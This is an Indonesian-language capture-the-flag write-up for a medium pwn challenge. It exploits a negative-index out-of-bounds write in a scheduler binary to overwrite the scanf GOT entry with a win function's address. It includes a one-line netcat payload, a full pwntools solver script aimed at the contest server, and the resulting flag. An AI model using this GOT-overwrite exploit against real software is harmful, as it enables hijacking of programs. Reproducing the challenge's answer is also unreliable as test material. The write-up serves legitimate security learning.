# Round Robin — Writeup

**Category    :** PWN  
**Difficulty  :** Medium  
**File        :** round_robin_dari_probset.zip (file asli bernama round_robin.zip atau rr.zip cuman baru error untuk di download)   
**Connection  :** 103.127.98.249 5003  
**Description :**

Seorang SysAdmin pemula di perusahaan rintisan mencoba memamerkan kejeniusannya dengan merancang sistem penjadwalan OS (Scheduler) kustom dari nol. Dia sesumbar bahwa pembagian kerjanya sempurna dan mustahil disusupi. Buktikan bahwa dia salah. Eksploitasi antrean prosesnya, ambil alih kendali tertinggi, dan jadilah raja di sistem itu!\n\nnc 103.127.98.249 5003

## Solve

Pertama kita extract file dari `round_robin_dari_probset.zip`, lalu cek isi binary-nya

```
unzip round_robin_dari_probset.zip
ls -la
file chall
```

output
```
drwxr-xr-x  5 ridwankusumahani  staff    160 Jul  4 04:21 .
drwxr-xr-x  6 ridwankusumahani  staff    192 Jul  3 17:44 ..
-rw-r--r--@ 1 ridwankusumahani  staff  14464 Jun 24 22:57 chall
-rw-r--r--@ 1 ridwankusumahani  staff   3231 Jul  3 14:10 round_robin_dari_probset.zip

chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d248c9beed17e3e5421cf5c66e209e95236b0f6a, for GNU/Linux 3.2.0, stripped
```

Hasil dari `file`, keliatan kalau file utamanya adalah `binary ELF`. Karena ini chall pwn, Kita coba cek proteksi binary-nya

```
checksec --file=chall
```

output
```
[!] Could not populate PLT: No module named 'unicorn'
[*] '/Users/ridwankusumahani/tools_cyber/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Karena binary menggunakan `Partial RELRO` dan `No PIE`, exploit yang akan kita coba adalah dengan mengubah alur eksekusi dengan `overwrite GOT` ke alamat fungsi tertentu yang sudah ada di binary. Kita coba akses 

```
https://103.127.98.249
```

![nc](image.png)

Dari fitur pada service itu, fitur yang bikin kita penasaran adalah `Edit Process`, karena fitur nya menerima input index process dan nilai baru untuk process. Kita buka binary di disassembler/decompiler untuk mencari fungsi penting.

Salah satu fungsi yang menarik itu fungsi yang menjalankan command untuk membaca flag. Di dalam fungsi tersebut terdapat pemanggilan `win function = 0x401399`. Selanjutnya kita cari bagian array process. Dari hasil analisis, data process disimpan mulai dari alamat `process array = 0x4040a0`, lalu setiap prosess memiliki ukuran 24 bytes. Di menu edit, program melakukan write ke field burst_time dengan pola `process[index].burst_time = input_user;`.

Kalau kita coba convert ke alamat memori, field burst_time ditulis ke `process_base + index * 24 + 8`. Tetapi, input index tidak divalidasi dengan benar. Normalnya index seharusnya hanya 0 sampai 9, tetapi program masih menerima index negatif, ini menyebabkan kita bisa menulis ke alamat sebelum array process

Karna bug utamanya adalah pada `Out of Bounds Write` menggunakan index negatif dam karna array process berada di alamat `0x4040a0`, kalau kita masukan index negatif, program akan menulis ke alamat sebelum array tersebut.

Target yang bisa dioverwrite adalah `GOT table`. Karena binary menggunakan `Partial RELRO`, `GOT` masih writable, aku cek GOT menggunakan pwntools

cek.py
```
from pwn import *

elf = ELF("./chall")

print("GOT entries:")
for k, v in elf.got.items():
    print(k, hex(v))

print("\nPLT entries:")
for k, v in elf.plt.items():
    print(k, hex(v))
```

output
```
!] Could not populate PLT: No module named 'unicorn'
[*] '/Users/ridwankusumahani/tools_cyber/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
GOT entries:
__libc_start_main 0x403fd8
gmon_start 0x403fe0
stdout 0x404060
stdin 0x404070
stderr 0x404080
puts 0x404000
system 0x404008
printf 0x404010
__isoc23_scanf 0x404018
getchar 0x404020
gets 0x404028
setvbuf 0x404030
exit 0x404038
usleep 0x404040

PLT entries:
```

Target overwrite yang akan kita pake adalah `__isoc23_scanf 0x404018`. Lalu untuk rumus alamat write pada field burst_time adlaah `process_base + index * 24 + 8`.

Diketahui 
process_base        = 0x4040a0
target GOT          = 0x404018
struct size         = 24
burst_time offset   = 8

Maka
0x404018 = 0x4040a0 + index * 24 + 8
0x404018 = 0x4040a8 + index * 24

Lalu
index * 24 = 0x404018 - 0x4040a8
index * 24 = -0x90
index = -0x90 / 24
index = -6

Maka index yang kita input adalah `-6`, karena input program menerima angka decimal untuk burst_time, alamat win `0x401399` harus dikirim dalam bentuk decimal

convert.py
```
print(int(0x401399))
```

output
```
4199321
```

Karna kita sudah dapet semua yang kita butuhkan, maka alur exploitnya `1`, `-6`, dan `4199321` maka kita bisa pakai payload `printf '1\n-6\n4199321\n' | nc 103.127.98.249 5003`. Saat payload dikirim, program akan menulis nilai `4199321` ke `__isoc23_scanf@GOT`. Namun karna `4199321` adalah decimal dari `0x401399`, maka `__isoc23_scanf@GOT` berubah menjadi alamat fungsi win.

Setelah itu program mencoba memanggil scanf lagi untuk baca status process, tetapi karena `GOT` sudah dioverwrite, program malah lompat ke win() dan menjalankan:

output_payload
```
=================================
    OS SCHEDULER SYSTEM v2.0     
=================================
1. Edit Process
2. Run Scheduler (Danger!)
3. Exit
> Pilih index proses (0-9) untuk di-edit: Set New Burst Time (long long): Set Status (0=Wait, 1=Finished): 
[!!!] ANOMALI DITERIMA. SYSTEM OVERRIDE SUCCESS.
SCTF26{r0und_r0b1n_scheduler_n1ghtm4re_72918403a}
```

solver.py
```
from pwn import *

HOST = "103.127.98.249"
PORT = 5003

elf = ELF("./chall")

WIN = 0x401399
SCANF_GOT = elf.got["__isoc23_scanf"]

PROCESS_BASE = 0x4040a0
STRUCT_SIZE = 24
BURST_OFFSET = 8

INDEX = (SCANF_GOT - PROCESS_BASE - BURST_OFFSET) // STRUCT_SIZE

log.info(f"win        = {hex(WIN)}")
log.info(f"scanf GOT  = {hex(SCANF_GOT)}")
log.info(f"index      = {INDEX}")

io = remote(HOST, PORT)

io.sendlineafter(b">", b"1")
io.sendlineafter(b":", str(INDEX).encode())
io.sendlineafter(b":", str(WIN).encode())

io.interactive()
```

output
```
[*] 'C:\\Users\\misuminitt\\Downloads\\Telegram Desktop\\SCTF\\pwn\\round robin\\chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
[*] win        = 0x401399
[*] scanf GOT  = 0x404018
[*] index      = -6
[x] Opening connection to 103.127.98.249 on port 5003
[x] Opening connection to 103.127.98.249 on port 5003: Trying 103.127.98.249
[+] Opening connection to 103.127.98.249 on port 5003: Done
[*] Switching to interactive mode
 Set Status (0=Wait, 1=Finished): 
[!!!] ANOMALI DITERIMA. SYSTEM OVERRIDE SUCCESS.
SCTF26{r0und_r0b1n_scheduler_n1ghtm4re_72918403a}
[*] Got EOF while reading in interactive
[*] Interrupted
[*] Closed connection to 103.127.98.249 port 5003
```

## Flag

```text
SCTF26{r0und_r0b1n_scheduler_n1ghtm4re_72918403a}
```
